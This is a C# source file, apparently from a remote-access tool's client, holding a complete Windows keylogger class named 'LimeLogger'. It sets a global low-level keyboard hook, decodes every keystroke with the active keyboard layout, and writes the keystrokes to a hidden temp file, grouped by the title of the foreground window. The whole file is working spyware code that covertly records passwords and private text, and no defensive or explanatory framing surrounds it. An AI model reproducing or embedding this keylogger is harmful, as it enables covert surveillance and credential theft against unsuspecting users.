using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Client.Helper;

public static class LimeLogger
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private static readonly string loggerPath = Environment.GetEnvironmentVariable("Temp") + "\\Log.tmp";

	private static string CurrentActiveWindowTitle;

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	private static int WHKEYBOARDLL = 13;

	public static void callk()
	{
		_hookID = SetHook(_proc);
		Application.Run();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(process.ProcessName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(lParam);
			bool flag = (GetKeyState(20) & 0xFFFF) != 0;
			bool flag2 = ((uint)GetKeyState(160) & 0x8000u) != 0 || (GetKeyState(161) & 0x8000) != 0;
			string text = KeyboardLayout((uint)num);
			text = ((!(flag || flag2)) ? text.ToLower() : text.ToUpper());
			if (num >= 112 && num <= 135)
			{
				Keys keys = (Keys)num;
				text = "[" + keys.ToString() + "]";
			}
			else
			{
				Keys keys = (Keys)num;
				switch (keys.ToString())
				{
				case "Space":
					text = "[SPACE]";
					break;
				case "Return":
					text = "[ENTER]";
					break;
				case "Escape":
					text = "[ESC]";
					break;
				case "LControlKey":
					text = "[CTRL]";
					break;
				case "RControlKey":
					text = "[CTRL]";
					break;
				case "RShiftKey":
					text = "[Shift]";
					break;
				case "LShiftKey":
					text = "[Shift]";
					break;
				case "Back":
					text = "[Back]";
					break;
				case "LWin":
					text = "[WIN]";
					break;
				case "Tab":
					text = "[Tab]";
					break;
				case "Capital":
					text = ((!flag) ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]");
					break;
				}
			}
			using StreamWriter streamWriter = new StreamWriter(loggerPath, append: true);
			if (CurrentActiveWindowTitle == GetActiveWindowTitle())
			{
				streamWriter.Write(text);
			}
			else
			{
				streamWriter.WriteLine(Environment.NewLine);
				streamWriter.WriteLine("###  " + GetActiveWindowTitle() + " ###");
				streamWriter.Write(text);
			}
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	private static string KeyboardLayout(uint vkCode)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] lpKeyState = new byte[256];
			if (!GetKeyboardState(lpKeyState))
			{
				return "";
			}
			uint wScanCode = MapVirtualKey(vkCode, 0u);
			uint lpdwProcessId;
			IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out lpdwProcessId));
			ToUnicodeEx(vkCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, keyboardLayout);
			return stringBuilder.ToString();
		}
		catch
		{
		}
		Keys keys = (Keys)vkCode;
		return keys.ToString();
	}

	private static string GetActiveWindowTitle()
	{
		try
		{
			GetWindowThreadProcessId(GetForegroundWindow(), out var lpdwProcessId);
			Process processById = Process.GetProcessById((int)lpdwProcessId);
			string text = processById.MainWindowTitle;
			if (string.IsNullOrWhiteSpace(text))
			{
				text = processById.ProcessName;
			}
			CurrentActiveWindowTitle = text;
			return text;
		}
		catch (Exception)
		{
			return "???";
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern short GetKeyState(int keyCode);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uCode, uint uMapType);
}
